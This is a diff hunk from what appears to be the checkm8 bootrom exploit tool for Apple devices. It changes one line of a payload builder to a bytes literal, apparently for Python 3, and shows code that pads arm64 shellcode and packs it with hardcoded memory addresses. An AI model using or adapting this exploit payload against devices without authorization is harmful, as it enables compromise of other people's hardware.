@@ -398,7 +398,7 @@ def payload(cpid):
         t8015_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8015)
         assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64
         assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64
-        t8015_shellcode = t8015_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
+        t8015_shellcode = t8015_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
         return struct.pack('<6Q16x448s1536x1024s', 0x180020400 - 8, 0x1000006A5, 0x180020600 - 8, 0x180000625,
                            0x18000C600 - 8, 0x180000625, t8015_callback_data, t8015_shellcode)
 
